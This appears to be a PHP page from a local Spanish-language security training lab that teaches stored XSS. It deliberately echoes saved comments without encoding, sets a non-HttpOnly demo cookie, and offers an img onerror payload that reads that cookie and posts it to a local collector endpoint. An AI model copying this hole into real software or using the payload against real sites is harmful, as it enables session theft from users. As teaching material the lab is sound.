<?php

declare(strict_types=1);

require_once __DIR__ . '/db.php';
require_once __DIR__ . '/session.php';
require_once __DIR__ . '/icons.php';

require_login();

$user = current_user();
$pdo = db();

function xss_stored_initials(array $user): string
{
    $parts = preg_split('/\s+/', trim((string) ($user['full_name'] ?? 'Usuario')));
    $initials = '';

    foreach (array_slice($parts ?: ['U'], 0, 2) as $part) {
        $initials .= strtoupper(substr($part, 0, 1));
    }

    return $initials !== '' ? $initials : 'U';
}

$pdo->exec(
    'CREATE TABLE IF NOT EXISTS xss_stored_comments (
        id SERIAL PRIMARY KEY,
        user_id INTEGER REFERENCES users(id),
        author_name VARCHAR(100) NOT NULL,
        content TEXT NOT NULL,
        ip_address VARCHAR(64),
        created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    )'
);

$pdo->exec(
    'CREATE TABLE IF NOT EXISTS xss_cookie_captures (
        id SERIAL PRIMARY KEY,
        captured_by_user_id INTEGER REFERENCES users(id),
        cookie_name VARCHAR(100) NOT NULL,
        cookie_value TEXT NOT NULL,
        page_url TEXT,
        ip_address VARCHAR(64),
        captured_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    )'
);

if (!isset($_COOKIE['LAB_XSS_DEMO'])) {
    setcookie(
        'LAB_XSS_DEMO',
        'fiis-demo-user-' . (string) ($user['id'] ?? '0'),
        [
            'expires' => 0,
            'path' => '/',
            'secure' => false,
            'httponly' => false,
            'samesite' => 'Lax',
        ]
    );
}

$message = null;
$messageClass = 'status-note';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = (string) ($_POST['action'] ?? 'create');

    if ($action === 'create') {
        $content = trim((string) ($_POST['content'] ?? ''));

        if ($content === '') {
            $message = 'Escribe un comentario antes de guardarlo.';
            $messageClass = 'status-note status-note-error';
        } else {
            $statement = $pdo->prepare(
                'INSERT INTO xss_stored_comments (
                    user_id,
                    author_name,
                    content,
                    ip_address
                ) VALUES (
                    :user_id,
                    :author_name,
                    :content,
                    :ip_address
                )'
            );

            $statement->execute([
                ':user_id' => (int) ($user['id'] ?? 0),
                ':author_name' => (string) ($user['full_name'] ?? 'Usuario'),
                ':content' => $content,
                ':ip_address' => (string) ($_SERVER['REMOTE_ADDR'] ?? 'unknown'),
            ]);

            header('Location: /xss-stored.php?saved=1');
            exit;
        }
    }

    if ($action === 'reset' && (string) ($user['role'] ?? '') === 'admin') {
        $pdo->exec('TRUNCATE TABLE xss_cookie_captures RESTART IDENTITY');
        $pdo->exec('TRUNCATE TABLE xss_stored_comments RESTART IDENTITY');
        header('Location: /xss-stored.php?reset=1');
        exit;
    }
}

if (isset($_GET['saved'])) {
    $message = 'Comentario almacenado correctamente. Se mostrará en cada visita.';
    $messageClass = 'status-note status-note-success';
}

if (isset($_GET['reset'])) {
    $message = 'Comentarios y capturas de demostración eliminados.';
    $messageClass = 'status-note status-note-success';
}

$comments = $pdo->query(
    'SELECT id, author_name, content, ip_address, created_at
     FROM xss_stored_comments
     ORDER BY created_at DESC, id DESC
     LIMIT 20'
)->fetchAll();

$captures = $pdo->query(
    'SELECT
        xss_cookie_captures.cookie_name,
        xss_cookie_captures.cookie_value,
        xss_cookie_captures.page_url,
        xss_cookie_captures.ip_address,
        xss_cookie_captures.captured_at,
        users.username
     FROM xss_cookie_captures
     LEFT JOIN users
        ON users.id = xss_cookie_captures.captured_by_user_id
     ORDER BY xss_cookie_captures.captured_at DESC
     LIMIT 10'
)->fetchAll();

$userInitials = xss_stored_initials($user);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Módulo 09 — XSS Stored</title>

    <script>
        (() => {
            const savedTheme = localStorage.getItem('securityLabTheme');

            if (savedTheme) {
                document.documentElement.dataset.theme = savedTheme;
            }
        })();
    </script>

    <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="/styles.css">

    <style>
        .stored-form textarea {
            width: 100%;
            min-height: 150px;
            padding: 14px;
            resize: vertical;
            border: 1px solid var(--border);
            border-radius: 11px;
            background: var(--surface);
            color: var(--text);
            font: inherit;
        }

        .stored-form textarea:focus {
            outline: 3px solid color-mix(in srgb, var(--accent-500) 20%, transparent);
            border-color: var(--accent-500);
        }

        .stored-example-list {
            display: grid;
            gap: 10px;
        }

        .stored-example-button {
            width: 100%;
            padding: 13px 14px;
            border: 1px solid var(--border);
            border-radius: 11px;
            background: var(--surface-soft);
            color: var(--text);
            font: inherit;
            text-align: left;
            cursor: pointer;
        }

        .stored-example-button strong,
        .stored-example-button code {
            display: block;
        }

        .stored-example-button strong {
            margin-bottom: 5px;
        }

        .stored-comments {
            display: grid;
            gap: 14px;
            margin-top: 18px;
        }

        .stored-comment {
            overflow: hidden;
            border: 1px solid var(--border);
            border-radius: 13px;
            background: var(--surface-soft);
        }

        .stored-comment-header {
            display: flex;
            justify-content: space-between;
            gap: 14px;
            padding: 13px 16px;
            border-bottom: 1px solid var(--border);
            background: var(--surface);
            color: var(--text-soft);
            font-size: 13px;
        }

        .stored-comment-body {
            min-height: 70px;
            padding: 18px;
            overflow-wrap: anywhere;
        }

        .stored-proof {
            margin-top: 18px;
            padding: 14px 16px;
            border: 1px dashed var(--accent-500);
            border-radius: 10px;
            background: var(--surface-soft);
            color: var(--text-soft);
            font-size: 13px;
        }

        .capture-value {
            max-width: 330px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .status-note {
            margin-bottom: 18px;
            padding: 13px 15px;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: var(--surface-soft);
        }

        .status-note-success {
            border-color: #8bc99a;
            background: #edf8f0;
            color: #17642b;
        }

        .status-note-error {
            border-color: #e5a49f;
            background: #fff1f0;
            color: #8b1a10;
        }

        [data-theme="dark"] .status-note-success,
        [data-theme="dark"] .status-note-error {
            background: var(--surface-soft);
        }

        .stored-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }

        .reset-button {
            padding: 11px 16px;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: var(--surface-soft);
            color: var(--text);
            font: inherit;
            cursor: pointer;
        }
    </style>
</head>

<body data-page="module-xss-stored">
<div class="app-shell">
    <aside class="sidebar">
        <div class="sidebar-brand">
            <div class="sidebar-logo">FI</div>

            <div>
                <strong>Service Desk FIIS</strong>
                <span>Security Lab · V1</span>
            </div>
        </div>

        <div class="sidebar-section-title">Navegación</div>

        <nav class="sidebar-nav">
            <a class="sidebar-link" href="/dashboard.php">
                <span class="sidebar-link-icon"><?= icon('home', 18) ?></span>
                Panel principal
            </a>

            <a class="sidebar-link active" href="/xss-stored.php">
                <span class="sidebar-link-icon"><?= icon('database', 18) ?></span>
                XSS Stored
            </a>

            <a class="sidebar-link" href="/evidence.php">
                <span class="sidebar-link-icon"><?= icon('activity', 18) ?></span>
                Registrar evidencia
            </a>
        </nav>

        <div class="sidebar-bottom">
            <div class="sidebar-user">
                <div class="sidebar-user-avatar"><?= htmlspecialchars($userInitials) ?></div>

                <div>
                    <strong><?= htmlspecialchars((string) ($user['full_name'] ?? 'Usuario')) ?></strong>
                    <span><?= htmlspecialchars((string) ($user['role'] ?? 'user')) ?></span>
                </div>
            </div>

            <a class="logout-link" href="/logout.php">Cerrar sesión</a>
        </div>
    </aside>

    <section class="main-area">
        <header class="top-header">
            <div class="top-header-left">
                <button
                    type="button"
                    class="icon-button mobile-menu-button"
                    data-sidebar-toggle
                    aria-label="Abrir menú"
                >
                    <?= icon('menu', 20) ?>
                </button>

                <div class="page-title">
                    <h1>XSS Stored</h1>
                    <p>Contenido persistente guardado en PostgreSQL y renderizado sin codificación</p>
                </div>
            </div>

            <div class="header-actions">
                <div class="environment-badge">
                    <span class="environment-dot"></span>
                    Riesgo alto
                </div>

                <button
                    type="button"
                    class="icon-button"
                    data-theme-toggle
                    aria-label="Cambiar tema"
                >
                    <span data-theme-moon><?= icon('moon', 19) ?></span>
                    <span data-theme-sun hidden><?= icon('sun', 19) ?></span>
                </button>
            </div>
        </header>

        <main class="content">
            <div class="breadcrumb">
                <a href="/dashboard.php">Panel</a>
                <span>/</span>
                <span>Módulo 09</span>
            </div>

            <section class="module-hero">
                <div class="module-hero-number">MÓDULO 09 · OWASP A03</div>
                <h1>Contenido persistente ejecutado al visitar la página</h1>
                <p>
                    Los comentarios se guardan en PostgreSQL y posteriormente se
                    insertan en el HTML sin codificación ni sanitización.
                </p>
            </section>

            <div class="warning-box">
                <strong>Entorno académico local:</strong>
                la demostración de captura registra únicamente la cookie ficticia
                <code>LAB_XSS_DEMO</code> dentro del mismo contenedor. No envía datos
                a servicios externos.
            </div>

            <section class="module-layout">
                <article class="panel-card">
                    <?php if ($message !== null): ?>
                        <div class="<?= htmlspecialchars($messageClass) ?>">
                            <?= htmlspecialchars($message) ?>
                        </div>
                    <?php endif; ?>

                    <div class="section-heading">
                        <div>
                            <h2>Publicar comentario</h2>
                            <p>El contenido quedará almacenado y se mostrará en visitas futuras.</p>
                        </div>
                    </div>

                    <form class="stored-form" method="post" action="/xss-stored.php">
                        <input type="hidden" name="action" value="create">

                        <div class="form-group">
                            <label for="content">Contenido del comentario</label>
                            <textarea
                                id="content"
                                name="content"
                                autocomplete="off"
                                required
                            ></textarea>
                        </div>

                        <div class="stored-actions">
                            <button class="primary-button" type="submit">
                                Guardar comentario
                                <span>→</span>
                            </button>

                            <?php if ((string) ($user['role'] ?? '') === 'admin'): ?>
                                <button
                                    class="reset-button"
                                    type="submit"
                                    name="action"
                                    value="reset"
                                    formnovalidate
                                    onclick="return confirm('¿Eliminar comentarios y capturas del módulo 09?')"
                                >
                                    Reiniciar módulo
                                </button>
                            <?php endif; ?>
                        </div>
                    </form>

                    <div class="stored-proof" id="stored-proof">
                        Estado de comprobación: todavía no se ha ejecutado el contenido almacenado de demostración.
                    </div>

                    <div style="margin-top: 26px;">
                        <div class="section-heading">
                            <div>
                                <h2>Comentarios almacenados</h2>
                                <p>Cada cuerpo se imprime deliberadamente sin <code>htmlspecialchars()</code>.</p>
                            </div>
                        </div>

                        <div class="stored-comments">
                            <?php if ($comments === []): ?>
                                <div class="stored-comment">
                                    <div class="stored-comment-body">
                                        Aún no se registraron comentarios.
                                    </div>
                                </div>
                            <?php endif; ?>

                            <?php foreach ($comments as $comment): ?>
                                <article class="stored-comment">
                                    <div class="stored-comment-header">
                                        <strong><?= htmlspecialchars((string) $comment['author_name']) ?></strong>
                                        <span>
                                            #<?= htmlspecialchars((string) $comment['id']) ?> ·
                                            <?= htmlspecialchars((string) $comment['created_at']) ?>
                                        </span>
                                    </div>

                                    <div class="stored-comment-body">
                                        <?php
                                        /*
                                         * Vulnerabilidad intencional del laboratorio:
                                         * contenido persistente renderizado sin codificación.
                                         */
                                        echo (string) $comment['content'];
                                        ?>
                                    </div>
                                </article>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </article>

                <aside class="module-status-card">
                    <h3>Ejemplos del laboratorio</h3>

                    <div class="stored-example-list">
                        <button
                            class="stored-example-button"
                            type="button"
                            data-stored-example="Comentario normal para el historial del ticket."
                        >
                            <strong>Texto normal</strong>
                            <code>Comentario normal...</code>
                        </button>

                        <button
                            class="stored-example-button"
                            type="button"
                            data-stored-example="&lt;strong&gt;Comentario HTML persistente&lt;/strong&gt;"
                        >
                            <strong>HTML persistente</strong>
                            <code>&lt;strong&gt;...&lt;/strong&gt;</code>
                        </button>

                        <button
                            class="stored-example-button"
                            type="button"
                            data-stored-example="&lt;img src=x onerror=&quot;(()=>{const item=document.cookie.split('; ').find(v=>v.startsWith('LAB_XSS_DEMO='))||'LAB_XSS_DEMO=(no encontrada)';fetch('/xss-collector.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie='+encodeURIComponent(item)+'&amp;page='+encodeURIComponent(location.href)}).then(()=>{const p=document.getElementById('stored-proof');if(p){p.textContent='Cookie ficticia capturada localmente mediante XSS Stored';}});this.remove();})()&quot;&gt;"
                        >
                            <strong>Captura local de cookie ficticia</strong>
                            <code>&lt;img src=x onerror=...&gt;</code>
                        </button>
                    </div>

                    <hr style="margin: 22px 0; border: 0; border-top: 1px solid var(--border);">

                    <h3>Punto de prueba</h3>
                    <table class="info-table">
                        <tr><th>Método</th><td>POST</td></tr>
                        <tr><th>Campo</th><td><code>content</code></td></tr>
                        <tr><th>Persistencia</th><td>PostgreSQL</td></tr>
                        <tr><th>Salida</th><td>Sin codificación</td></tr>
                    </table>

                    <hr style="margin: 22px 0; border: 0; border-top: 1px solid var(--border);">

                    <h3>Capturas locales</h3>

                    <div class="project-module-table-wrapper">
                        <table class="info-table">
                            <thead>
                            <tr>
                                <th>Usuario</th>
                                <th>Cookie</th>
                                <th>Fecha</th>
                            </tr>
                            </thead>

                            <tbody>
                            <?php if ($captures === []): ?>
                                <tr>
                                    <td colspan="3">Sin capturas registradas.</td>
                                </tr>
                            <?php endif; ?>

                            <?php foreach ($captures as $capture): ?>
                                <tr>
                                    <td><?= htmlspecialchars((string) ($capture['username'] ?? 'desconocido')) ?></td>
                                    <td
                                        class="capture-value"
                                        title="<?= htmlspecialchars((string) $capture['cookie_value'], ENT_QUOTES, 'UTF-8') ?>"
                                    >
                                        <code>
                                            <?= htmlspecialchars((string) $capture['cookie_name']) ?>=
                                            <?= htmlspecialchars((string) $capture['cookie_value']) ?>
                                        </code>
                                    </td>
                                    <td><?= htmlspecialchars((string) $capture['captured_at']) ?></td>
                                </tr>
                            <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </aside>
            </section>
        </main>

        <footer class="footer">
            Service Desk FIIS · Laboratorio local y autorizado
        </footer>
    </section>
</div>

<script src="/assets/app.js"></script>
<script>
    const storedInput = document.getElementById('content');

    document.querySelectorAll('[data-stored-example]').forEach((button) => {
        button.addEventListener('click', () => {
            storedInput.value = button.dataset.storedExample || '';
            storedInput.focus();
        });
    });
</script>
</body>
</html>
